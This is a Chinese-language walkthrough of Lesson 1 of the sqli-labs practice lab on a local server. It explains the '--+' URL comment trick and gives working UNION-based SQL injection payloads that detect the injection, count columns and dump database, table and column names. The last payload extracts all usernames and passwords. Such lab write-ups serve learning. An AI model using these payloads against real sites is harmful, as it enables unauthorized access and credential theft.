@@ -1,0 +1,23 @@
+﻿Lesson1
+访问lesson1页面我们可以看到：Please input the ID as parameter with numeric value
+翻译过来就是：请输入id作为带数值的参数
+下面正式开始进入闯关过程
+-- （这里有一个空格，--空格）在SQL内表示注释，但在URL中，如果在最后加上-- ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用--+代替-- ，原因是+在URL被URL编码后会变成空格。
+第一关 
+1.经过语句and 1=2测试 ，页面回显正常，所以该地方不是数值查询
+2.接着尝试在id后面加上'，发现页面回显不正常，表示可能存在SQL字符注入
+3.输入--+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型注入
+4.接着使用order by 语句判断，该表中一共有几列数据
+    order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。
+5.将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面是否有显示位
+    发现页面先输出了2和3，说明页面有2个显示位
+6.然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息
+例子：
+http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+
+这是一个查询数据库名信息的语句
+查询security内的所有表名
+http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
+接着使用下面的语句爆破出列名
+?id=861' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+
+接着使用如下语句查询所有的用户名，密码
+?id=861' union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)--+
